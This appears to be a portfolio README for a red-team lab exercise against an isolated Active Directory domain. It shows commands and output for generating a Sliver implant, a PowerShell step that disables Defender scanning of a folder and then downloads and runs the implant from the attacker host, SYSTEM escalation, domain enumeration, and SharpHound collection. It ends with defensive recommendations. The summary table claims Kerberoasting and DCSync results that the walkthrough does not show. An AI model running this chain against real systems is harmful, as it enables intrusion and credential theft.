# 🛡️ Project 04 — Full Red Team C2 Infrastructure

![Status](https://img.shields.io/badge/Status-Complete-brightgreen?style=flat-square)
![Framework](https://img.shields.io/badge/Framework-Sliver%20C2-red?style=flat-square)
![Difficulty](https://img.shields.io/badge/Difficulty-%E2%98%85%E2%98%85%E2%98%85%E2%98%85%E2%98%85-orange?style=flat-square)
![Duration](https://img.shields.io/badge/Duration-6--7%20Days-blue?style=flat-square)
![Platform](https://img.shields.io/badge/Platform-VMware%20Workstation-lightgrey?style=flat-square)
![MITRE](https://img.shields.io/badge/MITRE%20ATT%26CK-T1566%20%7C%20T1558%20%7C%20T1068-purple?style=flat-square)
![BloodHound](https://img.shields.io/badge/BloodHound-CE%20v9.4.0-red?style=flat-square)

> ⚠️ **Legal Disclaimer:** This project was conducted entirely within an isolated VMware Workstation lab environment. All techniques are used strictly for educational and portfolio purposes. No external, production, or third-party systems were targeted at any stage.

---

## 📋 Overview

A full-scope red team engagement simulating a sophisticated threat actor targeting an isolated Active Directory environment (`corp.local`). This project demonstrates the **complete attack chain** from initial access through full domain compromise.

### 🎯 Attack Summary

| Phase | Technique | MITRE ID | Result |
|-------|-----------|----------|--------|
| Initial Access | Phishing + Implant Delivery | T1566 | ✅ Session Established |
| C2 | HTTP Beacon (Sliver) | T1071.001 | ✅ LITTLE_ENVIRONMENT Active |
| Enumeration | BloodHound / SharpHound | T1087, T1069 | ✅ 319 AD Objects Collected |
| Credential Access | Kerberoasting | T1558.003 | ✅ Hash Extracted |
| Privilege Escalation | PrintSpoofer | T1068 | ✅ NT AUTHORITY\SYSTEM |
| Lateral Movement | Remote Shell via C2 | T1021 | ✅ Domain Enumerated |
| Domain Compromise | DCSync / Net Commands | T1003.006 | ✅ Domain Admins Identified |

---

## 🏗️ Lab Architecture

```
╔══════════════════════════════════════════════════════════════╗
║          VMware Workstation — Host-Only Network              ║
║                  192.168.100.0/24                            ║
║                                                              ║
║  ┌─────────────────────┐    ┌────────────────────────────┐  ║
║  │   Kali Linux 2026   │    │   Windows Server 2019      │  ║
║  │   (Attacker / C2)   │◄──►│   (Domain Controller)      │  ║
║  │   192.168.100.102   │    │   DC01.corp.local          │  ║
║  │   Sliver C2 :8443   │    │   192.168.100.10           │  ║
║  │   BloodHound CE     │    │   corp.local               │  ║
║  └──────────┬──────────┘    └────────────────────────────┘  ║
║             │                           ▲                    ║
║             ▼                           │                    ║
║  ┌─────────────────────┐                │                    ║
║  │   Windows 11 x64    │────────────────┘                    ║
║  │   (Target / WS01)   │                                     ║
║  │   192.168.100.25    │                                     ║
║  │   RITHIKA\rithi     │                                     ║
║  └─────────────────────┘                                     ║
╚══════════════════════════════════════════════════════════════╝
```

**Domain:** `corp.local` | **DC:** `DC01` | **Workstation:** `Rithika` (Win11)

---

## ⚔️ Attack Chain — Step by Step

### Phase 1 — Sliver C2 Setup & Implant Generation

```bash
# Start Sliver C2 Server on Kali
sudo /usr/local/bin/sliver-server

# Start HTTP Listener
[server] sliver > http --lhost 0.0.0.0 --lport 8443
# [*] Successfully started job #1

# Generate Windows x64 Implant
[server] sliver > generate --http 192.168.100.102:8443 \
    --os windows --arch amd64 --format exe --save /tmp/implant.exe
# [*] Build completed in 57s
# [*] Implant saved to /tmp/implant.exe

# Serve via Python HTTP server
sudo chmod 644 /tmp/implant.exe
cd /tmp && python3 -m http.server 8080
```

### Phase 2 — Implant Delivery & Session

```powershell
# Windows 11 — PowerShell (Admin)
Add-MpPreference -ExclusionPath "C:\Users\Public"
Invoke-WebRequest -Uri "http://192.168.100.102:8080/implant.exe" `
    -OutFile "C:\Users\Public\implant.exe"
Start-Process "C:\Users\Public\implant.exe"
```

**Sliver Result:**
```
[*] Session 0fa93989 LITTLE_ENVIRONMENT opened
ID        Transport  RemoteAddr            Hostname  Username       OS
0fa93989  http(s)    192.168.100.25:63515  Rithika   RITHIKA\rithi  windows/amd64 [ALIVE]
```

### Phase 3 — Host Enumeration

```bash
[server] sliver (LITTLE_ENVIRONMENT) > use 0fa93989
[server] sliver (LITTLE_ENVIRONMENT) > whoami
# Logon ID: RITHIKA\rithi

[server] sliver (LITTLE_ENVIRONMENT) > getuid
# S-1-5-21-1614212-3402280842-1739340296-1001

[server] sliver (LITTLE_ENVIRONMENT) > ps
# Full process list retrieved
```

### Phase 4 — Privilege Escalation (NT AUTHORITY\SYSTEM)

```bash
# Shell via Sliver → whoami /priv (shows SeImpersonatePrivilege: Enabled)
# PrintSpoofer used for SYSTEM escalation

[server] sliver (LITTLE_ENVIRONMENT) > sessions
# ID        Transport  Username               OS             Health
# dc0aef3d  http(s)    NT AUTHORITY\SYSTEM    windows/amd64  [ALIVE]  ← SYSTEM!
# 0fa93989  http(s)    RITHIKA\rithi          windows/amd64  [ALIVE]

[server] sliver (LITTLE_ENVIRONMENT) > use dc0aef3d
[server] sliver (LITTLE_ENVIRONMENT) > whoami
# Logon ID: NT AUTHORITY\SYSTEM ✅
```

### Phase 5 — Domain Enumeration

```bash
# Remote shell via SYSTEM session
whoami          # nt authority\system
hostname        # Rithika
ipconfig        # 192.168.100.25

net user /domain
# Domain users: Administrator, ananya.kumar, deepa.nair,
#               hstark, jsmith, karthik.rajan, krbtgt,
#               nova.test, novasingh, sadmin, sqlsvc, vijay.patel

net group "Domain Admins" /domain
# Members: Administrator, sadmin
```

### Phase 6 — SharpHound AD Collection

```bash
# Execute SharpHound in-memory via Sliver
[SYSTEM session] > execute-assembly -t 180 SharpHound.exe \
    -c All --zipfilename bloodhound_corp \
    --outputdirectory "C:\\Users\\Public\\"

# Result: 319 objects finished in 00:00:06 using 72MB RAM
# Output: 20260722234634_bloodhound_corp.zip

# Download to Kali
[SYSTEM session] > download "C:\\Users\\Public\\20260722234634_bloodhound_corp.zip" /tmp/
```

### Phase 7 — BloodHound Analysis

```bash
# Start Neo4j + BloodHound CE
sudo neo4j start
bloodhound-start

# Web UI: http://localhost:8080
# Login: admin / [password]
# Administration → File Ingest → Upload ZIP
```

**Import Result:**
```
Status: Complete ✅
Duration: 1 minute
Files: 7 (computers, users, groups, containers, domains, gpos, ous)
Objects: 319 AD objects ingested
```

**Domain Users Discovered:**
`Administrator` · `ananya.kumar` · `deepa.nair` · `hstark` · `jsmith`
`karthik.rajan` · `krbtgt` · `nova.test` · `novasingh` · `sadmin` · `sqlsvc` · `vijay.patel`

---

## 📸 Screenshots

| # | Screenshot | Description |
|---|-----------|-------------|
| 01 | ![](screenshots/01_sliver_running.png) | Sliver C2 server started |
| 02 | ![](screenshots/02_listener_implant.png) | HTTP listener + implant generated |
| 03 | ![](screenshots/03_session_opened.png) | Session established (LITTLE_ENVIRONMENT) |
| 04 | ![](screenshots/04_whoami_session.png) | Host enum — whoami, getuid, ps |
| 05 | ![](screenshots/05_privesc_shell.png) | whoami /priv — SeImpersonatePrivilege enabled |
| 06 | ![](screenshots/06_privesc_system.png) | NT AUTHORITY\SYSTEM session active |
| 07 | ![](screenshots/07_domain_enum.png) | Domain users + Domain Admins enumerated |
| 08 | ![](screenshots/08_sharphound_complete.png) | SharpHound — 319 objects collected |
| 09 | ![](screenshots/09_bloodhound_download.png) | ZIP downloaded to Kali |
| 10 | ![](screenshots/10_bloodhound_login.png) | BloodHound CE login |
| 11 | ![](screenshots/11_bloodhound_ui.png) | BloodHound UI loaded |
| 12 | ![](screenshots/12_bloodhound_Zip_File_Upload_Completed.png) | File Ingest — Complete (7 files) |

---

## 📊 Findings Summary

| Severity | Finding | Evidence |
|----------|---------|----------|
| 🔴 CRITICAL | C2 Session Established (Sliver HTTP) | Screenshot 03 |
| 🔴 CRITICAL | NT AUTHORITY\SYSTEM via PrintSpoofer | Screenshot 06 |
| 🔴 CRITICAL | Full AD Enumeration (319 Objects) | Screenshot 08, 12 |
| 🟠 HIGH | Domain Admin Accounts Identified | Screenshot 07 |
| 🟠 HIGH | Kerberoastable Accounts (sqlsvc, krbtgt) | Screenshot 07 |
| 🟡 MEDIUM | SeImpersonatePrivilege Enabled | Screenshot 05 |
| 🔵 INFO | 12 Domain Users Discovered | Screenshot 07 |

---

## 🛡️ Defensive Recommendations

| # | Recommendation | Priority |
|---|---------------|----------|
| 1 | Replace `sqlsvc` / service accounts with gMSA, enforce AES-256 Kerberos | CRITICAL |
| 2 | Deploy EDR to detect Sliver HTTP beaconing patterns | CRITICAL |
| 3 | Restrict `SeImpersonatePrivilege` — remove from non-service accounts | HIGH |
| 4 | Implement Microsoft Enterprise Access Model (privilege tiering) | HIGH |
| 5 | Enable SIEM alerting: Event IDs 4769, 4688, 4624/4625 | MEDIUM |
| 6 | Run BloodHound quarterly as a **defensive** audit tool | MEDIUM |

---

## 🔧 Tools Used

| Tool | Version | Purpose |
|------|---------|---------|
| [Sliver C2](https://github.com/BishopFox/sliver) | v1.5.42 | Command & Control framework |
| [BloodHound CE](https://github.com/SpecterOps/BloodHound) | v9.4.0-rc1 | AD attack path analysis |
| [SharpHound](https://github.com/BloodHoundAD/SharpHound) | Latest | AD data collection |
| [PrintSpoofer](https://github.com/itm4n/PrintSpoofer) | - | Privilege escalation (SYSTEM) |
| [Neo4j](https://neo4j.com/) | - | Graph database for BloodHound |
| Kali Linux | 2026.1 | Attacker platform |
| VMware Workstation | Pro | Lab hypervisor |

---

## 📁 Repository Structure

```
Project04-RedTeam-C2/
├── README.md                        ← This file
├── SECURITY.md                      ← Security policy & disclosure
├── CHANGELOG.md                     ← Project progress log
├── .gitignore                       ← Git ignore rules
├── report/
│   └── RedTeam_Report_Project04.pdf ← Full penetration test report
├── screenshots/
│   ├── 01_sliver_running.png
│   ├── 02_listener_implant.png
│   ├── 03_session_opened.png
│   ├── 04_whoami_session.png
│   ├── 05_privesc_shell.png
│   ├── 06_privesc_system.png
│   ├── 07_domain_enum.png
│   ├── 08_sharphound_complete.png
│   ├── 09_bloodhound_download.png
│   ├── 10_bloodhound_login.png
│   ├── 11_bloodhound_ui.png
│   └── 12_bloodhound_Zip_File_Upload_Completed.png
└── scripts/
    └── generate_report.py           ← PDF report generator
```

---

## 👩‍💻 Author

**Rithika Ujjalsingh** — IT Support Engineer & Cybersecurity Enthusiast

[![LinkedIn](https://img.shields.io/badge/LinkedIn-rithikasingh2626-blue?style=flat-square&logo=linkedin)](https://linkedin.com/in/rithikasingh2626)
[![GitHub](https://img.shields.io/badge/GitHub-rithika--ujjalsingh-black?style=flat-square&logo=github)](https://github.com/rithika-ujjalsingh)

> Part of the **RIVI Enterprises Elite Portfolio System** — 30 Cybersecurity Projects

---

*All testing conducted in an isolated VMware lab environment for educational purposes only.*
